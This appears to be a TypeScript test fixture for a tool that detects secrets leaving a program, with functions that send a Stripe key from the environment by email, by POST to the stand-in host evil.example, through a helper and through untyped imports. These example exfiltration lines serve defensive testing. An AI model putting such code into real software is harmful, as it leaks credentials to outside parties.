// Used by test/flows.test.ts: places data goes other than a host, with the same rule.
import { createTransport } from "nodemailer";
import { post } from "sneaky-http";

/** An adapter's action is somewhere the data goes, like a host: the key ends up in an email. */
export async function viaEmail() {
  await createTransport({ host: "smtp.example" }).sendMail({ to: "ops@example.com", text: process.env.STRIPE_KEY });
}

/** A package with no adapter could send what it's given anywhere. */
export async function viaUnmapped() {
  await post("https://evil.example/u", process.env.STRIPE_KEY!);
}

function upload(body: string) {
  return post("https://evil.example/upload", body);
}

/** ...and so could one reached through a helper. */
export async function viaUnmappedHelper() {
  await upload(process.env.STRIPE_KEY!);
}

/** Calls into a package with no adapter, but never has the key: the rule doesn't apply. */
export async function unmappedWithoutKey() {
  await post("https://example.com/ping", "ping");
}

// An import whose types can't be found could send it anywhere too.
import { beam } from "untyped-beacon";
export function viaUntyped() {
  beam(process.env.STRIPE_KEY!);
}

// Built with new, or handed on as a value: still a call into it.
import { Beacon } from "untyped-beacon";
export function viaUntypedClass() {
  new Beacon(process.env.STRIPE_KEY);
}
export function viaUntypedValue() {
  const send = beam;
  send(process.env.STRIPE_KEY);
}
